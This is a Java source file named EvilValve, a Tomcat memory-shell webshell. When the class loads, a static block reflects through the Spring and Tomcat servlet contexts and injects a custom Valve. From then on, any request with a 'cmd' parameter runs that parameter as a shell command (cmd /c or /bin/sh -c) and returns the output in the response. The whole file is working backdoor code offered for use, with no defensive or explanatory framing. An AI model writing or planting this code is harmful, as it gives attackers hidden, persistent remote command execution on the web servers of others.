import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

public class EvilValve extends ValveBase {
    static {
        try {
            System.out.println("Begin inject!--------");
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0);
            ServletContext servletContext = context.getServletContext();
            StandardContext o = null;
            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
            while (o == null) {
                Field f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                Object object = f.get(servletContext);

                if (object instanceof ServletContext) {
                    servletContext = (ServletContext) object;
                } else if (object instanceof StandardContext) {
                    o = (StandardContext) object;
                }
            }
            o.addValve(new EvilValve());
            System.out.println("Inject success !");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        PrintWriter writer = response.getWriter();
        String cmd = request.getParameter("cmd");
        if(cmd == null){
            return ;
        }
        String[] commands = new String[3];
        String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
        if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
            commands[0] = "cmd";
            commands[1] = "/c";
        } else {
            commands[0] = "/bin/sh";
            commands[1] = "-c";
        }
        commands[2] = cmd;
        String next = new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter("\\A").next();
        writer.write(next);
        writer.flush();
    }

    public static void main(String[] args) {
        System.out.println(1);
    }
}
